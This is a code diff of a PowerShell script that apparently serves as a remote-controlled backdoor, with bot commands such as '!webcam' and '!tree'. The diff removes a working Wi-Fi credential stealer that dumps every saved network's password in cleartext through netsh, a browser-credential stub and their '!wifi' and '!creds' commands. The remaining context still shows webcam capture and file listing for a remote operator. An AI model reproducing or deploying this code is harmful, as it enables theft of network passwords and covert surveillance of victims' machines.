@@ -83,68 +83,6 @@ function Connect-ZiPo {
     }
 }
 
-
-   function Get-WiFiCreds {
-    try {
-        # Получаем список профилей Wi-Fi с принудительной сменой кодовой страницы
-        $profilesOutput = cmd /c "chcp 65001 >nul & netsh wlan show profiles" | Out-String
-
-        # Используем регулярное выражение для получения имен профилей (поддерживаются английский и русский варианты)
-        $profileRegex = '(?:All User Profile|Все профили пользователей)\s*:\s*(.+)'
-        $profileMatches = [regex]::Matches($profilesOutput, $profileRegex)
-
-        if ($profileMatches.Count -eq 0) {
-            return "[INFO] Wi-Fi профили не найдены."
-        }
-
-        $results = "`nWi-Fi Credentials:`n"
-        foreach ($match in $profileMatches) {
-            $wifiName = $match.Groups[1].Value.Trim()
-            $results += "`nSSID: $wifiName`n"
-
-            # Формируем команду для получения подробной информации по профилю
-            $detailsCmd = "chcp 65001 >nul & netsh wlan show profile name=`"$wifiName`" key=clear"
-            $detailsOutput = cmd /c $detailsCmd | Out-String
-
-            # Регулярные выражения для извлечения нужных данных
-            $keyRegex    = '(?:Key Content|Содержимое ключа)\s*:\s*(.+)'
-            $authRegex   = '(?:Authentication|Аутентификация)\s*:\s*(.+)'
-            $cipherRegex = '(?:Cipher|Шифрование)\s*:\s*(.+)'
-
-            $keyMatch    = [regex]::Match($detailsOutput, $keyRegex)
-            $authMatch   = [regex]::Match($detailsOutput, $authRegex)
-            $cipherMatch = [regex]::Match($detailsOutput, $cipherRegex)
-
-            if ($keyMatch.Success) {
-                $keyContent = $keyMatch.Groups[1].Value.Trim()
-                $results += "Пароль: $keyContent`n"
-            }
-            else {
-                $results += "Пароль не найден`n"
-            }
-
-            if ($authMatch.Success) {
-                $authContent = $authMatch.Groups[1].Value.Trim()
-                $results += "Аутентификация: $authContent`n"
-            }
-
-            if ($cipherMatch.Success) {
-                $cipherContent = $cipherMatch.Groups[1].Value.Trim()
-                $results += "Шифрование: $cipherContent`n"
-            }
-        }
-        return $results
-    }
-    catch {
-        return "[ERROR] $($_.Exception.Message)"
-    }
-}
-
-
-    function Get-BrowserCreds {
-        return "[INFO] Browser creds not implemented — use external extractor."
-    }
-
     function Tree-List {
         return Get-ChildItem -Path $currentDir -Recurse | Select-Object FullName | Out-String
     }
@@ -225,12 +163,6 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                     }
                     elseif ($cmd -eq "!webcam") {
                         $response = Capture-Webcam
-                    }
-                    elseif ($cmd -eq "!wifi") {
-                        $response = Get-WiFiCreds
-                    }
-                    elseif ($cmd -eq "!creds") {
-                        $response = Get-BrowserCreds
                     }
                     elseif ($cmd -eq "!tree") {
                         $response = Tree-List
